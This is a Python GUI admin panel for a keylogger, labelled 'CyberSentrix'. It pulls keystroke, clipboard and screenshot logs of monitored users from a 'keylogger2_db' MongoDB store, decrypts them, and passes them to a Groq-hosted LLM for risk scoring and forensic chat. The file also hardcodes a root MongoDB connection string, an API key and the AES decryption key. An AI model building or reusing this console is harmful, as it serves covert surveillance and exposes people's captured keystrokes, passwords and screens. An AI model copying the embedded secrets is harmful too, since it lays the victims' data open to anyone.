import threading
import time
import math
import tkinter.messagebox
import re
import customtkinter as ctk
from tkinter import filedialog
from tkinter import ttk
from PIL import Image, ImageTk
import pymongo
import base64
import binascii
import io
import csv
import ast
from datetime import datetime
import matplotlib.pyplot as plt
from matplotlib.figure import Figure
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
from groq import Groq
from Crypto.Cipher import AES

########################################################
# MongoDB Setup
########################################################
MONGO_URI = "mongodb+srv://root:root@cluster0.m8lbp.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
client_db = pymongo.MongoClient(MONGO_URI)
db = client_db["keylogger2_db"]
logs_collection = db["logs"]
screenshots_collection = db["screenshots"]
clipboard_collection = db["clipboard_logs"]

# Ensure indexes for faster queries
logs_collection.create_index([("timestamp", pymongo.DESCENDING)])
screenshots_collection.create_index([("user", 1), ("timestamp", 1)])
clipboard_collection.create_index([("user", 1), ("timestamp", 1)])

########################################################
# AES Key & Groq AI Setup
########################################################
AES_KEY = bytes.fromhex("82d5d6060dff58f5875d520a6202b5384cfba4779a9db4e9c59ca3bce444a53e")
GROQ_API_KEY = "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"  # replace with your key
groq_client = Groq(api_key=GROQ_API_KEY)

########################################################
# Helper Functions: Encryption, Decryption, Truncation
########################################################
def decrypt_data(enc_text: str) -> str:
    if not enc_text:
        return enc_text
    try:
        raw = base64.b64decode(enc_text)
        if len(raw) < 32:
            return enc_text
        nonce = raw[:16]
        tag = raw[16:32]
        ctext = raw[32:]
        cipher = AES.new(AES_KEY, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt_and_verify(ctext, tag)
        return decrypted.decode("utf-8", errors="replace")
    except (binascii.Error, ValueError) as e:
        print(f"[ERROR] Decryption failed: {e}")
        return enc_text

def encrypt_data(plaintext: str) -> str:
    cipher = AES.new(AES_KEY, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode("utf-8"))
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode("utf-8")

def shorten_text(text: str, max_len=2000) -> str:
    if len(text) > max_len:
        return text[:max_len] + " [TRUNCATED]"
    return text

def safe_parse_keystrokes(s: str):
    try:
        parsed = ast.literal_eval(s)
        return parsed if isinstance(parsed, list) else []
    except Exception:
        return []

########################################################
# Log Retrieval Functions
########################################################
def group_keystroke_sessions(log_docs, gap_threshold=1.5):
    sessions = []
    if not log_docs:
        return sessions
    current_session = [log_docs[0]]
    prev_time = datetime.strptime(log_docs[0]["timestamp"], "%Y-%m-%d %H:%M:%S.%f")
    for doc in log_docs[1:]:
        try:
            curr_time = datetime.strptime(doc["timestamp"], "%Y-%m-%d %H:%M:%S.%f")
        except Exception:
            continue
        if doc["user"] == current_session[-1]["user"] and (curr_time - prev_time).total_seconds() <= gap_threshold:
            current_session.append(doc)
        else:
            sessions.append(current_session)
            current_session = [doc]
        prev_time = curr_time
    sessions.append(current_session)
    return sessions

def get_keystroke_sessions():
    docs = list(logs_collection.find().sort("timestamp", 1))
    sessions = group_keystroke_sessions(docs)
    sessions = list(reversed(sessions))
    rows = []
    for session in sessions:
        session_start_str = session[0]["timestamp"]
        session_end_str = session[-1]["timestamp"]
        try:
            start_dt = datetime.strptime(session_start_str, "%Y-%m-%d %H:%M:%S.%f")
            end_dt = datetime.strptime(session_end_str, "%Y-%m-%d %H:%M:%S.%f")
        except Exception:
            continue
        avg_speed = (end_dt - start_dt).total_seconds() / (len(session) - 1) if len(session) > 1 else 0.0
        keystrokes_concat = "".join(decrypt_data(doc.get("keystroke", "")) for doc in session)
        row = {
            "ip": session[0].get("ip", ""),
            "timestamp": start_dt,
            "timestamp_str": session_start_str,
            "user": session[0].get("user", "N/A"),
            "type": "Keystroke",
            "data": keystrokes_concat,
            "avg_speed": f"{avg_speed:.3f}"
        }
        rows.append(row)
    return rows

def get_clipboard_logs():
    docs = list(clipboard_collection.find().sort("timestamp", pymongo.DESCENDING))
    rows = []
    for doc in docs:
        ts_str = doc.get("timestamp", "N/A")
        try:
            ts_dt = datetime.strptime(ts_str, "%Y-%m-%d %H:%M:%S.%f")
        except Exception:
            continue
        row = {
            "ip": str(doc.get("ip", "")),
            "timestamp": ts_dt,
            "timestamp_str": ts_str,
            "user": doc.get("user", "N/A"),
            "type": "Clipboard",
            "data": decrypt_data(doc.get("clipboard", "")),
            "avg_speed": ""
        }
        rows.append(row)
    return rows

def get_screenshot_logs():
    docs = list(screenshots_collection.find().sort("timestamp", pymongo.DESCENDING))
    rows = []
    for doc in docs:
        ts_str = doc.get("timestamp", "N/A")
        try:
            ts_dt = datetime.strptime(ts_str, "%Y-%m-%d %H:%M:%S.%f")
        except Exception:
            continue
        row = {
            "ip": str(doc.get("ip", "")),
            "timestamp": ts_dt,
            "timestamp_str": ts_str,
            "user": doc.get("user", "N/A"),
            "type": "Screenshot",
            "data": "📸 Screenshot Available (click)",
            "avg_speed": ""
        }
        rows.append(row)
    return rows

def get_all_logs():
    try:
        rows = get_keystroke_sessions() + get_clipboard_logs() + get_screenshot_logs()
        rows.sort(key=lambda r: r["timestamp"], reverse=True)
        return rows
    except pymongo.errors.PyMongoError as e:
        print(f"[ERROR] MongoDB Connection Failed: {e}")
        return []

########################################################
# ModernScrollTable with Sorting and Tooltip Support
########################################################
class ModernScrollTable(ctk.CTkFrame):
    def __init__(self, master, sort_callback=None, on_row_double_click=None, **kwargs):
        if "on_row_double_click" in kwargs:
            del kwargs["on_row_double_click"]
        super().__init__(master, **kwargs)
        self.sort_callback = sort_callback  # Callback to sort columns
        self.on_row_double_click = on_row_double_click
        self.scroll_frame = ctk.CTkScrollableFrame(self, label_text="", corner_radius=0)
        self.scroll_frame.pack(fill="both", expand=True)
        self.data = []  # List of lists (each row)
        self.cell_widgets = []
        self.header_bg = "#333333"
        self.row_colors = ["#2B2B2B", "#1F1F1F"]
        self.hover_color = "#444444"
        self.text_color = "#FFFFFF"
        self.wraplength = 600

        # Initialize tooltip Toplevel (hidden by default)
        self.tooltip = ctk.CTkToplevel(self)
        self.tooltip.withdraw()
        self.tooltip_label = ctk.CTkLabel(self.tooltip, text="")
        self.tooltip_label.pack()

    def set_data(self, data: list[list[str]]):
        self.data = data
        self._build_table()

    def _build_table(self):
        for widget in self.scroll_frame.winfo_children():
            widget.destroy()
        self.cell_widgets = []
        if not self.data:
            return
        for i, row in enumerate(self.data):
            row_widgets = []
            bg_color = self.header_bg if i == 0 else self.row_colors[i % 2]
            for j, cell_text in enumerate(row):
                label = ctk.CTkLabel(
                    self.scroll_frame,
                    text=str(cell_text),
                    fg_color=bg_color,
                    text_color=self.text_color,
                    corner_radius=0,
                    wraplength=self.wraplength,
                    anchor="center"
                )
                label.grid(row=i, column=j, padx=1, pady=1, sticky="nsew")
                if i == 0:
                    label.bind("<Button-1>", lambda e, col=j: self.sort_callback(col) if self.sort_callback else None)
                else:
                    label.bind("<Enter>", lambda e, w=label: w.configure(fg_color=self.hover_color))
                    label.bind("<Leave>", lambda e, w=label, c=bg_color: w.configure(fg_color=c))
                    # Add tooltip for truncated data in "Data" column (index 4)
                    if j == 4:
                        full_text = self.data[i][j].replace(" [TRUNCATED]", "")
                        label.bind("<Enter>", lambda e, t=full_text: self.show_tooltip(t))
                        label.bind("<Leave>", lambda e: self.hide_tooltip())
                    # Bind double-click for Screenshot type rows
                    if self.data[i][3] == "Screenshot":
                        label.bind("<Double-1>", lambda e, row_i=i: self._handle_row_double_click(row_i))
                row_widgets.append(label)
            self.cell_widgets.append(row_widgets)
        col_count = len(self.data[0])
        for col_idx in range(col_count):
            self.scroll_frame.grid_columnconfigure(col_idx, weight=1, uniform="col")

    def _handle_row_double_click(self, row_i: int):
        if self.on_row_double_click:
            self.on_row_double_click(row_i)

    def show_tooltip(self, text):
        self.tooltip.deiconify()
        self.tooltip_label.configure(text=text)
        x = self.winfo_pointerx() + 10
        y = self.winfo_pointery() + 10
        self.tooltip.geometry(f"+{x}+{y}")

    def hide_tooltip(self):
        self.tooltip.withdraw()

########################################################
# AdminPanel with Enhanced Features (Grid-based)
########################################################
class AdminPanel(ctk.CTk):
    def __init__(self):
        super().__init__()
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("dark-blue")
        self.title("CyberSentrix 4.1 Panel")
        self.iconbitmap("Program_Icon.ico")

        self.update_idletasks()
        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()
        x = (screen_width - 1200) // 2
        y = (screen_height - 800) // 2
        self.geometry(f"1200x800+{x}+{y}")

        self.active_section = None
        self.sort_state = {}
        self.page_size = 50
        self.current_page = 0
        self.total_pages = 1

        # Use grid for main layout
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        ########################################################
        # SIDEBAR
        ########################################################
        self.sidebar_frame = ctk.CTkFrame(self, width=250, corner_radius=0)
        self.sidebar_frame.grid(row=0, column=0, sticky="nswe")
        # Removed sidebar label for a cleaner design; center the buttons in a container frame
        button_frame = ctk.CTkFrame(self.sidebar_frame, fg_color="transparent")
        button_frame.pack(expand=True, pady=20, fill="both")
        self.logs_button = ctk.CTkButton(button_frame, text="📄 View Logs", command=self.show_logs)
        self.logs_button.pack(pady=10, fill="x", padx=20)
        self.ai_button = ctk.CTkButton(button_frame, text="🤖 AI Analysis", command=self.show_ai_analysis)
        self.ai_button.pack(pady=10, fill="x", padx=20)
        self.stats_button = ctk.CTkButton(button_frame, text="📊 Stats", command=self.show_stats)
        self.stats_button.pack(pady=10, fill="x", padx=20)
        self.settings_button = ctk.CTkButton(button_frame, text="⚙️ Settings", command=self.show_settings)
        self.settings_button.pack(pady=10, fill="x", padx=20)

        ########################################################
        # MAIN FRAME (Logs Panel)
        ########################################################
        self.main_frame = ctk.CTkFrame(self, corner_radius=0)
        self.main_frame.grid(row=0, column=1, sticky="nsew", padx=20, pady=20)
        self.title_label = ctk.CTkLabel(self.main_frame, text="CyberSentrix Panel", font=("Arial", 26, "bold"))
        self.title_label.pack(pady=10)

        # Top Controls (Search & Filters)
        self.controls_frame = ctk.CTkFrame(self.main_frame)
        self.controls_frame.pack(pady=10, fill="x")
        self.search_entry = ctk.CTkEntry(self.controls_frame, placeholder_text="Search logs")
        self.search_entry.grid(row=0, column=0, padx=5, pady=5, sticky="ew")
        self.search_button = ctk.CTkButton(self.controls_frame, text="Search", command=self.search_logs)
        self.search_button.grid(row=0, column=1, padx=5, pady=5)
        self.clear_button = ctk.CTkButton(self.controls_frame, text="Clear", command=self.clear_filters)
        self.clear_button.grid(row=0, column=2, padx=5, pady=5)
        self.controls_frame.grid_columnconfigure(0, weight=1)

        # Advanced Filters
        self.filter_frame = ctk.CTkFrame(self.main_frame)
        self.filter_frame.pack(pady=5, fill="x")
        self.user_filter_entry = ctk.CTkEntry(self.filter_frame, placeholder_text="Filter by User")
        self.user_filter_entry.grid(row=0, column=0, padx=5, pady=5)
        self.type_filter_combo = ctk.CTkComboBox(self.filter_frame, values=["All", "Keystroke", "Clipboard", "Screenshot"], width=150)
        self.type_filter_combo.set("All")
        self.type_filter_combo.grid(row=0, column=1, padx=5, pady=5)
        self.date_from_entry = ctk.CTkEntry(self.filter_frame, placeholder_text="Date From (YYYY-MM-DD)")
        self.date_from_entry.grid(row=0, column=2, padx=5, pady=5)
        self.date_to_entry = ctk.CTkEntry(self.filter_frame, placeholder_text="Date To (YYYY-MM-DD)")
        self.date_to_entry.grid(row=0, column=3, padx=5, pady=5)
        filter_apply_btn = ctk.CTkButton(self.filter_frame, text="Apply Filters", command=self.search_logs)
        filter_apply_btn.grid(row=0, column=4, padx=5, pady=5)

        # Table and Paging Controls
        header = ["IP", "Timestamp", "User", "Type", "Data", "AvgSpeed(s/char)"]
        self.table_data = [header]
        self.modern_table = ModernScrollTable(self.main_frame, sort_callback=self.sort_table_by_column, on_row_double_click=self.handle_table_double_click)
        self.modern_table.pack(fill="both", expand=True, padx=20, pady=10)
        self.current_logs = []

        self.page_controls_frame = ctk.CTkFrame(self.main_frame)
        self.page_controls_frame.pack(pady=5)
        self.prev_button = ctk.CTkButton(self.page_controls_frame, text="Previous Page", command=self.prev_page)
        self.prev_button.grid(row=0, column=0, padx=5)
        self.page_label = ctk.CTkLabel(self.page_controls_frame, text="Page X of Y")
        self.page_label.grid(row=0, column=1, padx=5)
        self.next_button = ctk.CTkButton(self.page_controls_frame, text="Next Page", command=self.next_page)
        self.next_button.grid(row=0, column=2, padx=5)
        self.page_jump_entry = ctk.CTkEntry(self.page_controls_frame, placeholder_text="Page #", width=80)
        self.page_jump_entry.grid(row=0, column=3, padx=5)
        self.page_jump_button = ctk.CTkButton(self.page_controls_frame, text="Go", command=self.go_to_page)
        self.page_jump_button.grid(row=0, column=4, padx=5)

        # Suspicious Analysis Output
        self.suspicious_frame = ctk.CTkFrame(self.main_frame)
        self.suspicious_frame.pack(pady=10, fill="x")
        suspicious_label = ctk.CTkLabel(self.suspicious_frame, text="Real-Time Suspicious Analysis:", font=("Arial", 16, "bold"))
        suspicious_label.pack(anchor="w", padx=10)
        self.suspicious_text = ctk.CTkTextbox(self.suspicious_frame, width=900, height=80)
        self.suspicious_text.pack(padx=10, fill="x", expand=True)
        self.latest_alert = ""
        self.view_alert_button = ctk.CTkButton(self.suspicious_frame, text="View Latest Alert Details", command=self.show_latest_alert)
        self.view_alert_button.pack(pady=5)

        ########################################################
        # AI Analysis Panel (Grid-managed)
        ########################################################
        self.ai_frame = ctk.CTkFrame(self, corner_radius=0)
        self.ai_label = ctk.CTkLabel(self.ai_frame, text="AI Analysis Chat", font=("Arial", 22, "bold"))
        self.ai_label.pack(pady=10)
        self.user_filter_combo = ctk.CTkComboBox(self.ai_frame, values=self.get_unique_users(), width=200)
        self.user_filter_combo.set("Select User")
        self.user_filter_combo.pack(pady=5)
        self.refresh_users_button = ctk.CTkButton(self.ai_frame, text="Refresh Users", command=self.refresh_user_list)
        self.refresh_users_button.pack(pady=5)
        self.chat_display = ctk.CTkTextbox(self.ai_frame, width=900, height=400)
        self.chat_display.pack(pady=10, fill="both", expand=True)
        self.chat_input_frame = ctk.CTkFrame(self.ai_frame)
        self.chat_input_frame.pack(side="bottom", fill="x", pady=10)
        self.chat_input = ctk.CTkEntry(self.chat_input_frame, placeholder_text="Type your question or command...")
        self.chat_input.pack(side="left", expand=True, fill="x", padx=5)
        self.send_button = ctk.CTkButton(self.chat_input_frame, text="Send", command=self.send_ai_message)
        self.send_button.pack(side="left", padx=5)
        self.ai_frame.grid_remove()  # Hide initially

        ########################################################
        # Settings Panel (Grid-managed, Placeholder)
        ########################################################
        self.settings_frame = ctk.CTkFrame(self, corner_radius=0)
        settings_label = ctk.CTkLabel(self.settings_frame, text="Settings Panel (Placeholder)", font=("Arial", 22, "bold"))
        settings_label.pack(pady=20)
        self.settings_frame.grid_remove()  # Hide initially

        ########################################################
        # Start Log Refresh and Real-Time Analysis
        ########################################################
        self.calculate_total_pages()
        self.load_paged_logs()
        self.rt_interval = 10.0
        self.rt_stop_event = threading.Event()
        self.start_real_time_analysis()

    # NEW: Add set_active_section to fix the AttributeError
    def set_active_section(self, section):
        self.active_section = section
        for btn in [self.logs_button, self.ai_button, self.stats_button, self.settings_button]:
            btn.configure(fg_color="#1F6AA5")
        if section == "logs":
            self.logs_button.configure(fg_color="#4a8eda")
        elif section == "ai":
            self.ai_button.configure(fg_color="#4a8eda")
        elif section == "stats":
            self.stats_button.configure(fg_color="#4a8eda")
        elif section == "settings":
            self.settings_button.configure(fg_color="#4a8eda")

    # Helper methods to center pop-ups and show alert dialogs
    def center_popup(self, popup, width, height):
        popup.update_idletasks()
        screen_width = popup.winfo_screenwidth()
        screen_height = popup.winfo_screenheight()
        x = (screen_width - width) // 2
        y = (screen_height - height) // 2
        popup.geometry(f"{width}x{height}+{x}+{y}")

    def show_alert_dialog(self, alert_message):
        top = ctk.CTkToplevel(self)
        top.title("Security Alert")
        self.center_popup(top, 400, 200)
        label = ctk.CTkLabel(top, text=alert_message, wraplength=380)
        label.pack(pady=20, padx=20)
        button = ctk.CTkButton(top, text="OK", command=top.destroy)
        button.pack(pady=10)
        top.grab_set()
        top.lift()
        top.focus_force()

    def trigger_alert(self, message, severity_level):
        severity_mapping = {
            3: ("🟠 SIGNIFICANT RISK", "Potential sensitive data exposure detected."),
            4: ("🔴 HIGH RISK", "Possible security breach detected. Immediate investigation required."),
            5: ("🚨 CRITICAL ALERT", "‼️ **LEAK DETECTED** - Confirmed data leak or breach. Take urgent action!")
        }
        alert_title, alert_desc = severity_mapping.get(severity_level, ("⚠️ ALERT", "Unknown security concern detected."))
        alert_message = f"{alert_title}\n\n{alert_desc}\n\n{message}"
        self.after(0, lambda: (
            self.show_alert_dialog(alert_message),
            self.suspicious_text.insert("end", f"\n[ALERT]: {alert_message}\n"),
            self.lift()
        ))

    def show_latest_alert(self):
        if not self.latest_alert:
            tkinter.messagebox.showinfo("Alert Details", "No alerts available.")
            return
        top = ctk.CTkToplevel(self)
        top.title("Latest Alert Details")
        self.center_popup(top, 800, 400)
        text = ctk.CTkTextbox(top, width=800, height=400)
        text.insert("0.0", self.latest_alert)
        text.pack(padx=10, pady=10)
        top.grab_set()
        top.lift()
        top.focus_force()

    ########################################################
    # Real-time Analysis
    ########################################################
    def start_real_time_analysis(self):
        self.last_analyzed_timestamp = None

        def analyze_loop():
            while not self.rt_stop_event.is_set():
                time.sleep(self.rt_interval)
                self.analyze_new_logs()

        threading.Thread(target=analyze_loop, daemon=True).start()

    def analyze_new_logs(self):
        keystroke_sessions = get_keystroke_sessions()
        if not keystroke_sessions:
            return
        latest = keystroke_sessions[0]
        latest_timestamp = latest["timestamp_str"]
        if self.last_analyzed_timestamp == latest_timestamp:
            return
        self.last_analyzed_timestamp = latest_timestamp
        merged_text = latest["data"]
        if not merged_text:
            return
        avg_speed = latest.get("avg_speed", "N/A")
        prompt = f"""
You are an advanced security AI analyzing keystroke logs.

**Severity Ratings:**
- 🟢 1 (Low Risk): Normal typing behavior.
- 🟡 2 (Moderate Risk): Unusual but not dangerous activity.
- 🟠 3 (Significant Risk): Potential sensitive data exposure.
- 🔴 4 (High Risk): Highly suspicious activity detected.
- 🚨 5 (Critical Risk - LEAK DETECTED): Confirmed security breach.

**Keystroke Data:** {merged_text}
**Typing Speed:** {avg_speed} sec/char

Your Task: Identify risk level, detected issues, and recommend actions.
        """
        try:
            messages = [
                {"role": "system", "content": "You are a cybersecurity AI detecting threats in keystroke logs."},
                {"role": "user", "content": prompt}
            ]
            chat_completion = groq_client.chat.completions.create(
                messages=messages,
                model="llama-3.3-70b-versatile",
                temperature=0.5,
                max_tokens=32768
            )
            response = chat_completion.choices[0].message.content
            # Update the regex to look for "Risk Level:" instead of "**Severity:**"
            severity_match = re.search(r"Risk Level:\s*[^\d]*(\d+)", response)
            severity_level = int(severity_match.group(1)) if severity_match else 1
            alert_icon = "🟢" if severity_level == 1 else "🟡" if severity_level == 2 else "🟠" if severity_level == 3 else "🔴" if severity_level == 4 else "🚨"
            self.latest_alert = f"{time.strftime('%H:%M:%S')} {alert_icon} (Severity {severity_level}):\n{response}"
            def ui_update():
                self.suspicious_text.insert("end", f"\n---\n{self.latest_alert}\n")
                if severity_level >= 3:
                    self.trigger_alert(response, severity_level)
            self.after(0, ui_update)
        except Exception as e:
            error_str = f"[AI Analysis Error] {e}"
            self.after(0, lambda: self.suspicious_text.insert("end", error_str + "\n"))

    ########################################################
    # Paging and Filtering Functions
    ########################################################
    def calculate_total_pages(self):
        all_logs = self.apply_filters(get_all_logs())
        self.total_pages = math.ceil(len(all_logs) / self.page_size)
        if self.total_pages < 1:
            self.total_pages = 1

    def load_paged_logs(self):
        def fetch_data():
            all_logs = self.apply_filters(get_all_logs())
            self.current_logs = all_logs
            self.calculate_total_pages()
            start_index = self.current_page * self.page_size
            end_index = start_index + self.page_size
            page_logs = all_logs[start_index:end_index]
            rows = [["IP", "Timestamp", "User", "Type", "Data", "AvgSpeed(s/char)"]]
            for log in page_logs:
                rows.append([log["ip"], log["timestamp_str"], log["user"], log["type"], log["data"], log["avg_speed"]])
            self.after(0, lambda: self.update_table(rows))
        threading.Thread(target=fetch_data, daemon=True).start()

    def update_table(self, rows):
        self.table_data = rows
        self.modern_table.set_data(self.table_data)
        self.update_page_label()
        self.after(10000, self.load_paged_logs)

    def update_page_label(self):
        self.page_label.configure(text=f"Page {self.current_page+1} of {self.total_pages}")

    def next_page(self):
        if self.current_page < self.total_pages - 1:
            self.current_page += 1
            self.load_paged_logs()

    def prev_page(self):
        if self.current_page > 0:
            self.current_page -= 1
            self.load_paged_logs()

    def go_to_page(self):
        try:
            page_num = int(self.page_jump_entry.get()) - 1
            if 0 <= page_num < self.total_pages:
                self.current_page = page_num
                self.load_paged_logs()
        except ValueError:
            pass

    def apply_filters(self, logs):
        search_text = self.search_entry.get().strip().lower()
        user_filter = self.user_filter_entry.get().strip().lower()
        type_filter = self.type_filter_combo.get()
        date_from = self.date_from_entry.get().strip()
        date_to = self.date_to_entry.get().strip()
        filtered = []
        for log in logs:
            if search_text and search_text not in log["data"].lower() and search_text not in log["user"].lower():
                continue
            if user_filter and user_filter not in log["user"].lower():
                continue
            if type_filter != "All" and type_filter != log["type"]:
                continue
            if date_from:
                try:
                    log_date = datetime.strptime(log["timestamp_str"][:10], "%Y-%m-%d")
                    from_date = datetime.strptime(date_from, "%Y-%m-%d")
                    if log_date < from_date:
                        continue
                except Exception:
                    pass
            if date_to:
                try:
                    log_date = datetime.strptime(log["timestamp_str"][:10], "%Y-%m-%d")
                    to_date = datetime.strptime(date_to, "%Y-%m-%d")
                    if log_date > to_date:
                        continue
                except Exception:
                    pass
            filtered.append(log)
        return filtered

    def search_logs(self):
        self.current_page = 0
        self.load_paged_logs()

    def clear_filters(self):
        self.search_entry.delete(0, "end")
        self.user_filter_entry.delete(0, "end")
        self.type_filter_combo.set("All")
        self.date_from_entry.delete(0, "end")
        self.date_to_entry.delete(0, "end")
        self.current_page = 0
        self.load_paged_logs()

    ########################################################
    # Column Sorting
    ########################################################
    def sort_table_by_column(self, col_index):
        ascending = self.sort_state.get(col_index, True)
        self.sort_state[col_index] = not ascending
        def sort_key(log):
            header = ["IP", "Timestamp", "User", "Type", "Data", "AvgSpeed(s/char)"]
            field = header[col_index]
            if field == "Timestamp":
                try:
                    return datetime.strptime(log["timestamp_str"], "%Y-%m-%d %H:%M:%S.%f")
                except Exception:
                    return datetime.min
            elif field == "AvgSpeed(s/char)":
                try:
                    return float(log.get("avg_speed", "0"))
                except Exception:
                    return 0.0
            else:
                return log.get(field.lower(), "").lower()
        self.current_logs.sort(key=sort_key, reverse=not ascending)
        rows = [["IP", "Timestamp", "User", "Type", "Data", "AvgSpeed(s/char)"]]
        for log in self.current_logs:
            rows.append([log["ip"], log["timestamp_str"], log["user"], log["type"], log["data"], log["avg_speed"]])
        self.table_data = rows
        self.modern_table.set_data(self.table_data)

    ########################################################
    # Table Double-Click (for Screenshot Logs)
    ########################################################
    def handle_table_double_click(self, row_index):
        if row_index <= 0 or row_index >= len(self.table_data):
            return
        row = self.table_data[row_index]
        if row[3] != "Screenshot":
            return
        ts = row[1]
        user = row[2]
        screenshot_doc = screenshots_collection.find_one({
            "user": user,
            "timestamp": {"$gte": ts}
        })
        if screenshot_doc and "screenshot" in screenshot_doc:
            base64_data = screenshot_doc["screenshot"]
            dec_data = decrypt_data(base64_data)
            try:
                image_bytes = base64.b64decode(dec_data)
            except Exception as e:
                print("Failed to decode image data:", e)
                return
            top = ctk.CTkToplevel(self)
            top.title("Screenshot Viewer")
            self.center_popup(top, 800, 600)
            top.grid_columnconfigure(0, weight=1)
            top.grid_rowconfigure(0, weight=1)
            try:
                image = Image.open(io.BytesIO(image_bytes))
            except Exception as e:
                print("Failed to open image:", e)
                return
            img_width, img_height = image.size
            ratio = min(800/img_width, 600/img_height)
            image = image.resize((int(img_width*ratio), int(img_height*ratio)))
            photo = ImageTk.PhotoImage(image)
            label = ctk.CTkLabel(top, image=photo, text="")
            label.image = photo
            label.grid(row=0, column=0, sticky="nsew")
            top.grab_set()
            top.lift()
            top.focus_force()
        else:
            print("No screenshot available for this entry.")

    ########################################################
    # Export Logs to CSV
    ########################################################
    def export_logs(self):
        file_name = filedialog.asksaveasfilename(
            title="Save Logs",
            defaultextension=".csv",
            filetypes=[("CSV Files", "*.csv")]
        )
        if not file_name:
            return
        all_logs = get_all_logs()
        try:
            with open(file_name, "w", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow(["IP", "Timestamp", "User", "Type", "Data", "AvgSpeed(s/char)"])
                for log in all_logs:
                    writer.writerow([log["ip"], log["timestamp_str"], log["user"], log["type"], log["data"], log["avg_speed"]])
            print("Logs exported successfully!")
        except Exception as e:
            print("Export failed:", e)

    ########################################################
    # AI Chat Functions
    ########################################################
    def refresh_user_list(self):
        users = self.get_unique_users()
        self.user_filter_combo.configure(values=users)

    def get_unique_users(self):
        logs = get_all_logs()
        users = sorted(set(log["user"] for log in logs))
        return users if users else ["No Users"]

    def send_ai_message(self):
        user_text = self.chat_input.get().strip()
        if not user_text:
            return
        selected_user = self.user_filter_combo.get()
        self.chat_display.insert("end", f"You ({selected_user}): {user_text}\n")
        self.chat_input.delete(0, "end")
        self.chat_display.insert("end", "AI: Analyzing...\n")
        def run_ai_chat():
            try:
                all_logs = get_all_logs()[:200]
                lines = []
                for log in all_logs:
                    avg_speed = log.get("avg_speed", "N/A")
                    combined = f"{log['timestamp_str']} | {log['user']} | {log['type']} | {log['data']} | Avg Speed: {avg_speed} sec/char"
                    truncated = shorten_text(combined, 1000)
                    lines.append(truncated)
                merged = "\n".join(lines)
                prompt = f"You're a forensic AI. Analyze these logs and the behavior for user {selected_user}.\n{merged}\n\nQuestion: {user_text}"
                chat_completion = groq_client.chat.completions.create(
                    messages=[{"role": "user", "content": prompt}],
                    model="llama-3.3-70b-versatile",
                    temperature=0.5,
                    max_tokens=32768
                )
                response = chat_completion.choices[0].message.content
                def ui_update():
                    self.chat_display.insert("end", f"Groq AI:\n{response}\n")
                self.after(0, ui_update)
            except Exception as ex:
                error_str = f"API Error: {ex}"
                self.after(0, lambda: self.chat_display.insert("end", f"{error_str}\n"))
        threading.Thread(target=run_ai_chat, daemon=True).start()

    ########################################################
    # Sidebar Navigation Functions
    ########################################################
    def show_logs(self):
        self.set_active_section("logs")
        self.title_label.configure(text="CyberSentrix Panel")
        self.ai_frame.grid_remove()
        self.settings_frame.grid_remove()
        self.main_frame.grid()  # show logs panel
        self.calculate_total_pages()
        self.load_paged_logs()

    def show_ai_analysis(self):
        self.set_active_section("ai")
        self.title_label.configure(text="AI Analysis Panel")
        self.main_frame.grid_remove()
        self.settings_frame.grid_remove()
        # Use grid to display the AI panel
        self.ai_frame.grid(row=0, column=1, sticky="nsew", padx=20, pady=20)

    def show_settings(self):
        self.set_active_section("settings")
        self.title_label.configure(text="Settings Panel")
        self.main_frame.grid_remove()
        self.ai_frame.grid_remove()
        # Use grid to display the Settings panel
        self.settings_frame.grid(row=0, column=1, sticky="nsew", padx=20, pady=20)

    def show_stats(self):
        self.set_active_section("stats")
        top = ctk.CTkToplevel(self)
        top.title("Logs Statistics")
        self.center_popup(top, 900, 600)
        logs = get_all_logs()
        stats = {}
        for log in logs:
            day = log["timestamp_str"][:10]
            stats[day] = stats.get(day, 0) + 1
        days = sorted(stats.keys())
        counts = [stats[day] for day in days]
        fig = Figure(figsize=(8, 4))
        ax = fig.add_subplot(111)
        ax.plot(days, counts, marker="o")
        ax.set_xlabel("Date")
        ax.set_ylabel("Number of Logs")
        ax.set_title("Logs Per Day")
        ax.tick_params(axis='x', rotation=45)
        canvas = FigureCanvasTkAgg(fig, master=top)
        canvas.draw()
        canvas.get_tk_widget().pack(fill="both", expand=True)
        top.grab_set()
        top.lift()
        top.focus_force()

    ########################################################
    # Window Closing
    ########################################################
    def on_closing(self):
        self.rt_stop_event.set()
        self.destroy()

########################################################
# Main Execution
########################################################
if __name__ == "__main__":
    app = AdminPanel()
    app.protocol("WM_DELETE_WINDOW", app.on_closing)
    app.mainloop()
